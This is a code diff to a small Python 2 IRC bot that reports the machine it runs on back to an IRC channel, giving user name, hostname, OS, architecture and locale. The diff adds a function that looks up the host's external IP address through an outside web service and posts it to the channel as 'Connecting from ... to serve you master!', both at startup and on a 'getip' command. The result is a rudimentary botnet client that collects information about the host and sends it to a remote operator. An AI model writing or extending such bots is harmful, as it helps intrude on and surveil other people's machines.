@@ -11,6 +11,7 @@ import sys # CLI options
 import os # System calls
 import platform # System info gathering
 import locale # System language
+import urllib2 # Used to get external ip address
 
 # Global variables to configure the bot        
 server = sys.argv[1]  # Server
@@ -37,20 +38,23 @@ def usage(): # Usage information
 def ping(): # Function to respond to server pings
   ircsock.send('PONG :pingis\n')
 
-def getlogin():
+def getlogin(): # Function to get user name
   print 'Sending message -- User name: ' + str(os.getlogin())
   sendmsg(channel, 'User name: ' + str(os.getlogin()))  
 
-def sysinfo():
+def sysinfo(): # Function to getlogin system information
   print 'Sending system information'
   sendmsg(channel, 'Computer: ' + platform.uname()[1])
   sendmsg(channel, 'OS: ' + platform.platform()) 
   sendmsg(channel, 'Arch: ' + platform.machine())
   sendmsg(channel, 'Language: ' + locale.getdefaultlocale()[0])
 
+def get_external_ip(): # Function to get external ip address
+    ip = urllib2.urlopen('http://automation.whatismyip.com/n09230945.asp').read()
+    sendmsg(channel, 'Connecting from ' + ip + ' to serve you master!')
 
 def sendmsg(chan , msg): # Function to send messages to the channel
-  ircsock.send('PRIVMSG '+ chan +' :'+ msg +'\n') 
+  ircsock.send('PRIVMSG '+ chan +' :'+ msg +'\n')
 
 def joinchan(chan): # Function to join channels
   ircsock.send('JOIN '+ chan +'\n')
@@ -62,12 +66,13 @@ def connect(): # Connects to the server, finds commands, etc.
   ircsock.connect((server, int(port))) # Connect to the server
   ircsock.send('USER ' + botnick + ' ' + botnick + ' ' + botnick + ' :' + botnick + '\n') # User authentication
   ircsock.send('NICK '+ botnick +'\n') # Assign NICK to the bot
-  joinchan(channel) # Join the channel 
+  joinchan(channel) # Join the channel
 
 def main():
   os.system('clear') # Clear the screen
   banner() # Print the banner
   connect() # Connect to the server
+  get_external_ip()  # Show where the bot is connecting from
 
   while 1: # WARNING: May cause an infinite loop
 
@@ -76,7 +81,7 @@ def main():
     print(ircmsg) # Print server's messages
   
     if ircmsg.find(':Hello '+ botnick) != -1: # Calls hello() if 'Hello BotName' is found
-      hello() 
+      hello()
 
     if ircmsg.find('PING :') != -1: # Respond to server pings
       ping()
@@ -86,6 +91,9 @@ def main():
 
     if ircmsg.find(':sysinfo '+ botnick) != -1: # Calls sysinfo() if 'sysinfo BotName' is found
       sysinfo()    
+
+    if ircmsg.find(':getip '+ botnick) != -1: # Calls get_external_ip() if 'getip BotName' is found
+      get_external_ip()
 
 if __name__ == '__main__':
   if len(sys.argv) <> 5:  
